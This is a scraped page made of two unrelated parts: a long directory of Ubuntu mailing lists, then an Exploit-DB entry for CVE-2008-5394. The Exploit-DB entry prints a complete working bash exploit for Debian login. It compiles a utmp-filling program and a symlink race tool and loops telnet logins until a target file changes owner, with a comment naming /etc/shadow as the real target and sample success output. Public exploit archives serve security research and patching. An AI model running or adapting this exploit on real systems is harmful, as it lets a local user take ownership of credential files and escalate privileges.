* [ubuntu-us-fl](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-fl) -
  Mailing list for Ubuntu Florida LoCo Team
* [ubuntu-us-ga](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-ga) -
  Georgia Ubuntu Mailing List
* [ubuntu-us-ia](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-US-IA) -
  Ubuntu Iowa Team
* [ubuntu-us-id](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-id) -
  Ubuntu US Idaho
* [ubuntu-us-il](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-il) -
  Ubuntu Illinois Local Community Team Mailing List
* [ubuntu-us-in](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-in) -
  Ubuntu's Indiana Local Community Team
* [ubuntu-us-ks](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-ks) -
  Kansas Ubuntu Users Mailing List
* [ubuntu-us-ky](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-ky) -
  Kentucky LoCo Team mailing list
* [ubuntu-us-la](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-la) -
  Ubuntu Louisiana Local Community Team
* [ubuntu-us-ma](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-ma) -
  Ubuntu Massachusetts Local Community Team
* [ubuntu-us-md](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-md) -
  Ubuntu Maryland Loco Team
* [ubuntu-us-me](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-me) -
  Ubuntu Maine-iacs LoCo Team list
* [ubuntu-us-mi](http://lists.ubuntu.com/mailman/listinfo/ubuntu-us-mi) -
  Ubuntu Michigan Local Community Team
* [ubuntu-us-mn](http://lists.ubuntu.com/mailman/listinfo/ubuntu-us-mn) -
  Ubuntu Minnesota Local Community Team
* [ubuntu-us-mo](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-mo) -
  Ubuntu Missouri Team
* [ubuntu-us-ms](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-US-MS) -
  Mailing List for the Mississippi Ubuntu LoCo Team
* [ubuntu-us-nc](http://lists.ubuntu.com/mailman/listinfo/ubuntu-us-nc) -
  Ubuntu North Carolina Local Community Team
* [ubuntu-us-nd](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-nd) -
  Ubuntu North Dakota Local Community Team
* [ubuntu-us-ne](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-ne) -
  Ubuntu Nebraska Local Community Team
* [ubuntu-us-nh](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-US-NH) -
  Ubuntu New Hampshire LoCo Team
* [ubuntu-us-nj](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-nj) -
  Mailing list for the Ubuntu New Jersey LoCo Team
* [ubuntu-us-nm](http://lists.ubuntu.com/mailman/listinfo/ubuntu-us-nm) -
  Ubuntu US New Mexico LoCo Team
* [ubuntu-us-nv](http://lists.ubuntu.com/mailman/listinfo/ubuntu-us-nv) -
  Ubuntu Nevada Local Community Team
* [ubuntu-us-oh](http://lists.ubuntu.com/mailman/listinfo/ubuntu-us-oh) -
  Ubuntu Ohio
* [ubuntu-us-ok](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-ok) -
  Oklahoma LoCo list
* [ubuntu-us-or](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-or) -
  Ubuntu Oregon LoCo Team
* [ubuntu-us-pa](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-pa) -
  Ubuntu has got a friend in Pennsylvania
* [ubuntu-us-pnw](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-pnw) -
  Ubuntu- PNWTeam
* [ubuntu-us-ri](http://lists.ubuntu.com/mailman/listinfo/ubuntu-us-ri) -
  Ubuntu Rhode Island Local Community Team
* [ubuntu-us-sc](http://lists.ubuntu.com/mailman/listinfo/ubuntu-us-sc) -
  Ubuntu US - South Carolina
* [ubuntu-us-sd](http://lists.ubuntu.com/mailman/listinfo/ubuntu-us-sd) -
  Ubuntu South Dakota LoCo Team
* [ubuntu-us-tn](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-US-TN) -
  Ubuntu Tennessee LoCo Team
* [ubuntu-us-tx](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-tx) -
  Ubuntu Texas Local Community Team
* [ubuntu-us-tx-dallas](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-tx-dallas) -
  Ubuntu DallasTeam Mailing List
* [ubuntu-us-ut](http://lists.ubuntu.com/mailman/listinfo/ubuntu-us-ut) -
  Ubuntu Utah Local Community Team
* [ubuntu-us-va](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-va) -
  Ubuntu US Virginia
* [ubuntu-us-vt](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-vt) -
  Ubuntu Vermont Local Community Team
* [ubuntu-us-wa](http://lists.ubuntu.com/mailman/listinfo/ubuntu-us-wa) -
  Ubuntu Washington State Local Community List
* [ubuntu-us-wi](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-us-wi) -
  Ubuntu US Wisconsin Local Community Team
* [ubuntu-us-wv](http://lists.ubuntu.com/mailman/listinfo/ubuntu-us-wv) -
  Ubuntu West Virginia Local Community Team
* [ubuntu-uy](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-uy) -
  Grupo de usuarios de Ubuntu Linux del Uruguay
* [ubuntu-ve](http://lists.ubuntu.com/mailman/listinfo/ubuntu-ve) -
  Ubuntu de Venezuela
* [ubuntu-vn](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-VN) -
  Ubuntu VN
* [ubuntu-za](http://lists.ubuntu.com/mailman/listinfo/ubuntu-za) -
  Ubuntu South African Local Community
* [ubuntu-zh](http://lists.ubuntu.com/mailman/listinfo/ubuntu-zh) -
  ubuntu-zh mailing lists
* [ubuntu-zm](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-zm) -
  Ubuntu Zambia
* [ubuntu-zw](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-zw) -
  Zimbabwe Local Team
* [kubuntu-de](http://lists.ubuntu.com/mailman/listinfo/kubuntu-de) -
  Deutschsprachige Kubuntu Community Mailingliste
* [loco-contacts](http://lists.ubuntu.com/mailman/listinfo/loco-contacts) -
  Ubuntu local community team (LoCo) contacts
* [locoteams-dev](http://lists.ubuntu.com/mailman/listinfo/locoteams-dev) -
  discussing code that helps LoCoTeams prosper

## Localization Lists

* [ubuntu-es-l10n](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-es-l10n) -
  Lista de coordinaciÃ³n del equipo de traducciÃ³n al espaÃ±ol de Ubuntu
* [ubuntu-fr-l10n](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-fr-l10n) -
  Liste pour la coordination de l'Ã©quipe francophone de traduction d'Ubuntu
* [ubuntu-l10n-am](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-am) -
  Ubuntu Amharic Translation and user
* [ubuntu-l10n-amh](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-amh) -
  Ubuntu Amharic translation
* [ubuntu-l10n-ara](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-ara) -
  Arabic translators list - القائمة البريدية لترجمة أوبونتو العربية
* [ubuntu-l10n-arn](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-arn) -
  Ubuntu Mapudungun Translation
* [ubuntu-l10n-ast](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-ast) -
  Ubuntu Asturian Translators
* [ubuntu-l10n-bel](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-bel) -
  Ubuntu Belarusian Translation
* [ubuntu-l10n-ben](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-ben) -
  Ubuntu Bengali Translation
* [ubuntu-l10n-ca](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-ca) -
  Ubuntu Catalan Translators list -- Llista de traducció de l'Ubuntu al català
* [ubuntu-l10n-eng](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-eng) -
  A list for English translations
* [ubuntu-l10n-est](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-est) -
  Ubuntu Estonian translators
* [ubuntu-l10n-eus](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-eus) -
  Ubuntu Basque translators list
* [ubuntu-l10n-fas](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-fas) -
  Ubuntu Persian Translation (ترجمهٔ فارسی اوبونتو)
* [ubuntu-l10n-fin](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-fin) -
  Ubuntu Finnish translators (Ubuntun suomentajaryhmä)
* [ubuntu-l10n-gl](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-gl) -
  List for coordination of Ubuntu Galician translation team
* [ubuntu-l10n-guc](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-guc) -
  Ubuntu Wayuunaiki Translation discussion
* [ubuntu-l10n-he](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-he) -
  Ubuntu Hebrew Translation
* [ubuntu-l10n-hu](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-hu) -
  List for coordination of Ubuntu Hungarian translation team
* [ubuntu-l10n-ie](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-ie) -
  Ubuntu Irish Translation Team
* [ubuntu-l10n-it](http://lists.ubuntu.com/mailman/listinfo/ubuntu-l10n-it) -
  Mailing list del gruppo di traduzione italiano
* [ubuntu-l10n-kir](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-kir) -
  Ubuntu Kirghiz Translation
* [ubuntu-l10n-ko](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-ko) -
  Ubuntu Korean Translators
* [ubuntu-l10n-kur](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-kur) -
  Listeya wergerandina Ubuntu bi kurdi
* [ubuntu-l10n-kw](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-kw) -
  Cornish translation team
* [ubuntu-l10n-lao](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-lao) -
* [ubuntu-l10n-lin](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-lin) -
  Ubuntu Lingala Translation
* [ubuntu-l10n-mal](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-mal) -
  Ubuntu Malayalam Translation
* [ubuntu-l10n-mar](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-mar) -
  List for coordination of Ubuntu Marathi translation team
* [ubuntu-l10n-mhr](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-mhr) -
  Translating Ubuntu to Meadow Mari
* [ubuntu-l10n-miq](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-miq) -
  Ubuntu Miskito Translators
* [ubuntu-l10n-mlg](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-mlg) -
  Ubuntu Malagasy Translators
* [ubuntu-l10n-my](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-my) -
  Ubuntu Burmese Translators List
* [ubuntu-l10n-nds](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-nds) -
* [ubuntu-l10n-nl](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-nl) -
  Dutch Translations for Ubuntu
* [ubuntu-l10n-oci](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-oci) -
  CÃ²la de revirada en occitan d'Ubuntu
* [ubuntu-l10n-oji](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-oji) -
  Ubuntu Ojibwe Translators
* [ubuntu-l10n-ori](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-ori) -
* [ubuntu-l10n-ptbr](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-ptbr) -
  Brazilian translators list
* [ubuntu-l10n-que](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-que) -
* [ubuntu-l10n-ru](http://lists.ubuntu.com/mailman/listinfo/ubuntu-l10n-ru) -
  List for coordination of Ubuntu Russian translation team
* [ubuntu-l10n-shs](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-shs) -
  Discussing Ubuntu Secwepemctsín L10N
* [ubuntu-l10n-slo](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-slo) -
* [ubuntu-l10n-swa](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-swa) -
  Ubuntu Swahili Tranlators Team mailing list.
* [ubuntu-l10n-tam](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-tam) -
  உபுண்டு தமிழாக்க மடலாடற் குழு
* [ubuntu-l10n-tha](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-tha) -
  Ubuntu Thai Translation
* [ubuntu-l10n-tib](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-tib) -
* [ubuntu-l10n-urd](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-urd) -
  Ubuntu Urdu Translation
* [ubuntu-l10n-wol](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-wol) -
  Ubuntu Wolof translation team
* [ubuntu-l10n-yid](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-yid) -
  Yiddish translation team (ubuntu-l10n-yi)
* [ubuntu-l10n-zh](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-l10n-zh) -
* [ubuntu-pl-l10n](http://lists.ubuntu.com/mailman/listinfo/ubuntu-pl-l10n) -
  List for coordination of Ubuntu Polish translation team

The mailing list laptop-testing-team could not be found!
The mailing list juju could not be found!
The mailing list juju-dev could not be found!
## Other Ubuntu Projects and Groups

* [free-software-laptop](http://lists.ubuntu.com/mailman/listinfo/free-software-laptop) -
  Laptops that work well with pure Free Software drivers and OpenBIOS
* [ubuntu-accessibility](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-accessibility) -
  mailing list of the accessibility team
* [ubuntu-advantage](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-Advantage) -
  For Ubuntu Advantage customers only - run by Canonical Support
* [ubuntu-arabic](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-arabic) -
  Ubuntu-Arabic team
* [ubuntu-art](http://lists.ubuntu.com/mailman/listinfo/ubuntu-art) -
  Discussion on Ubuntu artwork
* [ubuntu-ast](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-ast) -
  ComunidÃ¡ Asturiana d'Ubuntu
* [ubuntu-backports](http://lists.ubuntu.com/mailman/listinfo/ubuntu-backports) -
  Backports Discussion
* [ubuntu-bj-ctn](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-bj-ctn) -
  Cotonou, Benin LoCo team
* [ubuntu-bluetooth](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-bluetooth) -
  Discussion about Bluetooth on Ubuntu
* [ubuntu-br-council](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-br-council) -
* [ubuntu-burning](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-burning) -
  Mailing list for the ubuntu burning team
* [ubuntu-cat](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-cat) -
  Ubuntu Catalan mailing list
* [ubuntu-classroom-es](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-classroom-es) -
  Ubuntu Classroom project in Spanish
* [ubuntu-cloud](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-cloud) -
  Discussions about Ubuntu Cloud
* [ubuntu-community-team](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-community-team) -
  A place where organisers (not necessarily developers) in our community discuss upcoming events, initiatives, get help and hang out.
* [ubuntu-core-marketing](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-core-marketing) -
  Ubuntu Core Marketing Team List
* [ubuntu-cym](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-cym) -
  Ubuntu Cymru / Wales LoCo Talk
* [ubuntu-dct](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-DCT) -
  Debian Collaboration Team
* [ubuntu-directory](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-directory) -
  Ubuntu Directory Team
* [ubuntu-doc](http://lists.ubuntu.com/mailman/listinfo/ubuntu-doc) -
  Documentation team coordination and discussion
* [ubuntu-doc-spa](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-doc-spa) -
  DocumentaciÃ³n de Ubuntu en espaÃ±ol
* [ubuntu-education](http://lists.ubuntu.com/mailman/listinfo/ubuntu-education) -
  Education topics across any Ubuntu product
* [ubuntu-flavors](http://lists.ubuntu.com/mailman/listinfo/ubuntu-flavors) -
  Cross-flavor discussion
* [ubuntu-gal](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-gal) -
* [ubuntu-gnome](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-GNOME) -
  Ubuntu GNOME Coordination and Discussion
* [ubuntu-hardened](http://lists.ubuntu.com/mailman/listinfo/ubuntu-hardened) -
  Ubuntu security discussion
* [ubuntu-in-dl](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-in-dl) -
  Ubuntu Delhi Loco Team List
* [ubuntu-in-gj](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-in-gj) -
  Ubuntu India - Gujarat
* [ubuntu-in-tn](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-in-tn) -
  UBUNTU IN TAMILNADU INDIA
* [ubuntu-installer](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-installer) -
  Ubuntu installer development
* [ubuntu-irc](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-irc) -
  Ubuntu IRC issues discussion list
* [ubuntu-java](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-java) -
* [ubuntu-jobs](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-jobs) -
  ANNOUNCE of Ubuntu related jobs
* [ubuntu-leadership](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-leadership) -
  ubuntu-leadership
* [ubuntu-membership-boards](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-membership-boards) -
* [ubuntu-mirrors](http://lists.ubuntu.com/mailman/listinfo/ubuntu-mirrors) -
  Announcements, feedback and discussion for Ubuntu mirror maintainers
* [ubuntu-mono](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-mono) -
  Packaging Mono for Ubuntu
* [ubuntu-motu-p2p](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-motu-p2p) -
* [ubuntu-motu-science](http://lists.ubuntu.com/mailman/listinfo/ubuntu-motu-science) -
  development and discussion of Science applications in Ubuntu
* [ubuntu-mx-df](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-mx-df) -
* [ubuntu-mythtv](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-mythtv) -
  Ubuntu's MythTV & Mythbuntu teams
* [ubuntu-news-team](http://lists.ubuntu.com/mailman/listinfo/ubuntu-news-team) -
  Submit and discuss any Ubuntu related news stories
* [ubuntu-news-translations](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-news-translations) -
  Ubuntu Weekly News Translation Team
* [ubuntu-nordic](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-nordic) -
  Ubuntu Nordic
* [ubuntu-patch-reviews](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-patch-reviews) -
  Ubuntu patch reviews list
* [ubuntu-platform](http://lists.ubuntu.com/mailman/listinfo/ubuntu-platform) -
  Ubuntu Platform
* [ubuntu-reviews](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-reviews) -
  Discussion of Ubuntu merge proposals
* [ubuntu-screencasts](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-screencasts) -
  Ubuntu screencast team list
* [ubuntu-scribes](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-scribes) -
  Help augment and enhance the archival of Ubuntu community meetings and events.
* [ubuntu-security-patch](http://lists.ubuntu.com/mailman/listinfo/ubuntu-security-patch) -
  Ubuntu Security Patch Announcements
* [ubuntu-server-arm](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-server-arm) -
* [ubuntu-soc](http://lists.ubuntu.com/mailman/listinfo/ubuntu-soc) -
  Discussion list for Ubuntu participants in the Google Summer of Code programme
* [ubuntu-sponsors](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-sponsors) -
* [ubuntu-students](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-students) -
  Ubuntu students Mailing list.
* [ubuntu-sugarteam](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-sugarteam) -
  Sugar Learning Environment for Ubuntu
* [ubuntu-telepathy](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-telepathy) -
  Discussion about Telepathy on Ubuntu
* [ubuntu-translators](http://lists.ubuntu.com/mailman/listinfo/ubuntu-translators) -
  Discussion about translating Ubuntu
* [ubuntu-women](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-Women) -
  Ubuntu-Women
* [ubuntu-x](http://lists.ubuntu.com/mailman/listinfo/Ubuntu-x) -
  Discussion of improving X stability and performance on Ubuntu
* [ubuntustudio-testing](http://lists.ubuntu.com/mailman/listinfo/ubuntustudio-testing) -

## Bazaar-related Lists

* [bazaar](http://lists.ubuntu.com/mailman/listinfo/bazaar) -
  bazaar discussion
* [bazaar-announce](http://lists.ubuntu.com/mailman/listinfo/bazaar-announce) -
  Announcements for the Bazaar project
* [bazaar-commits](http://lists.ubuntu.com/mailman/listinfo/bazaar-commits) -
  Bazaar repository commit notification

## Storm Lists

* [storm](http://lists.ubuntu.com/mailman/listinfo/storm) -
  Discussion of the Storm Object Relational Mapper for the Python Language

## Discontinued (Historical) Lists

* [karmic-changes](http://lists.ubuntu.com/mailman/listinfo/karmic-changes) -
  Karmic Koala archive upload notification list
* [jaunty-changes](http://lists.ubuntu.com/mailman/listinfo/jaunty-changes) -
  Jaunty Jackalope archive upload notification list
* [intrepid-changes](http://lists.ubuntu.com/mailman/listinfo/intrepid-changes) -
  Intrepid Ibex archive upload notification list
* [dapper-changes](http://lists.ubuntu.com/mailman/listinfo/dapper-changes) -
  DapperDrake archive upload notification list
* [breezy-changes](http://lists.ubuntu.com/mailman/listinfo/breezy-changes) -
  BreezyBadger archive upload notification list [Historical]
* [hoary-changes](http://lists.ubuntu.com/mailman/listinfo/hoary-changes) -
  HoaryHedgehog archive upload notification list [Historical]
* [motu-council](http://lists.ubuntu.com/mailman/listinfo/motu-council) -
  [OBSOLETE] administrative list for motu-council, also handles motu new developer applications.
* [rosetta-users](http://lists.ubuntu.com/mailman/listinfo/rosetta-users) -
  This list is CLOSED, please use launchpad-users instead
* [sounder](http://lists.ubuntu.com/mailman/listinfo/sounder) -
  [OBSOLETE] Ubuntu community random chit-chat list
* [team-council-members](http://lists.ubuntu.com/mailman/listinfo/team-council-members) -
  [OBSOLETE] Please go to http://launchpad.net/~ubuntu-council-teams instead
* [ubuntu-changes-auto](http://lists.ubuntu.com/mailman/listinfo/ubuntu-changes-auto) -
  Archive upload notification list, for automated uploads to all Ubuntu releases
* [ubuntu-classroom](http://lists.ubuntu.com/mailman/listinfo/ubuntu-classroom) -
  Ubuntu Classroom Management
* [ubuntu-event-planners](http://lists.ubuntu.com/mailman/listinfo/ubuntu-event-planners) -
  Ubuntu Event Planners
* [ubuntu-motu-mentors](http://lists.ubuntu.com/mailman/listinfo/ubuntu-motu-mentors) -
  [OBSOLETE] MOTU Mentoring happens here
* [ubuntu-mozillateam](http://lists.ubuntu.com/mailman/listinfo/ubuntu-mozillateam) -
  Ubuntu Mozilla packaging team
* [ubuntu-mozillateam-bugs](http://lists.ubuntu.com/mailman/listinfo/ubuntu-mozillateam-bugs) -
  Ubuntu Mozilla bugs
* [ubuntu-universe-sponsors](http://lists.ubuntu.com/mailman/listinfo/ubuntu-universe-sponsors) -
  [OBSOLETE] List for sponsors for Master of the Universe
* [warty-changes](http://lists.ubuntu.com/mailman/listinfo/warty-changes) -
  WartyWarthog archive upload notification list [Historical]
* [gutsy-changes](http://lists.ubuntu.com/mailman/listinfo/gutsy-changes) -
  Gutsy Gibbon archive upload notification list
* [feisty-changes](http://lists.ubuntu.com/mailman/listinfo/feisty-changes) -
  Feisty Fawn archive upload notification list
* [edgy-changes](http://lists.ubuntu.com/mailman/listinfo/edgy-changes) -
  EdgyEft archive upload notification list

© 2013 Canonical Ltd. Ubuntu and Canonical are registered trademarks of [Canonical Ltd](http://canonical.com).



=== Content from www.exploit-db.com_b1d1c421_20250125_151811.html ===

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# Debian - Symlink In Login Arbitrary File Ownership

#### EDB-ID:

###### 7313

#### CVE:

###### [2008-5394](https://nvd.nist.gov/vuln/detail/CVE-2008-5394)

---

**EDB Verified:**

#### Author:

###### [Paul Szabo](/?author=267)

#### Type:

###### [local](/?type=local)

---

#### Platform:

###### [Linux](/?platform=linux)

#### Date:

###### 2008-12-01

---

**Vulnerable App:**

```
#!/bin/bash -

echo '
	#include <string.h>
	#include <stdlib.h>
	#include <unistd.h>
	#include <utmp.h>
	#include <sys/types.h>
	#include <stdio.h>

	int main(int argc, char *argv[])
	{
	  struct utmp entry;
	  int i;

	  entry.ut_type=LOGIN_PROCESS;
	  strcpy(entry.ut_line,"/tmp/x");
	  entry.ut_time=0;
	  strcpy(entry.ut_user,"badguy");
	  strcpy(entry.ut_host,"badhost");
	  entry.ut_addr=0;
	  for(i=1;i<9;i++) {
	    entry.ut_pid=(pid_t)( i + (int)getpid() );
	    sprintf(entry.ut_id,"bad%d",i);
	    pututline(&entry);
	  }
	}
' > /tmp/fillutmp.c

cc -o /tmp/fillutmp /tmp/fillutmp.c

echo 'Ask someone with group utmp privileges to do:'
echo '  chgrp utmp /tmp/fillutmp; chmod 2755 /tmp/fillutmp'
echo -n 'Press [RETURN] to continue... '
read ANS

echo '
	#include <unistd.h>

	int main(int argc, char *argv[])
	{
	  while(1)
	  {
	    unlink("/tmp/x");
	    symlink(argv[1],"/tmp/x");
	    unlink("/tmp/x");
	    symlink(argv[2],"/tmp/x");
	  }
	}
' > /tmp/jigglelnk.c

cc -o /tmp/jigglelnk /tmp/jigglelnk.c

HOST=`hostname` # or simply localhost?
echo "Which tty do you think a 'telnet $HOST' will use next?"
echo "(Do that telnet and see...)"
read TTY
echo "You said it will be '$TTY' ..."

ATK=/etc/debian_version # should be /etc/shadow

echo "Starting symlink re-jiggler ..."
/tmp/jigglelnk $TTY $ATK &
JIG=$!

LOOP=0
while :; do
  ((LOOP = $LOOP + 1))
  echo; echo; echo "Try = $LOOP"

  /tmp/fillutmp

  echo "Telnetting... if login succeeds, just exit for next try..."
  /usr/bin/telnet $HOST

  LS=`ls -ld $ATK`
  case "$LS" in
    *root*root* ) ;; # not done yet...
    * )
      echo; echo
      echo "Success after $LOOP tries!"
      echo "$LS"
      echo; echo
      break
    ;;
  esac
done

kill $JIG
rm /tmp/fillutmp /tmp/jigglelnk /tmp/x

# ...
# ~$ logout
# Connection closed by foreign host.
# Success after 12 tries!
# -rw------- 1 psz tty 4 Oct 28  2006 /etc/debian_version

# milw0rm.com [2008-12-01]

```

**Tags:**

**Advisory/Source:**
Link

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Databases
[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links
[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites
[OffSec](https://www.offsec.com)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com)

Solutions
[Courses and Certifications](https://www.offsec.com/courses-and-certifications/)
[Learn Subscriptions](https://www.offsec.com/learn/)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/)
[Proving Grounds](https://www.offsec.com/labs/)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
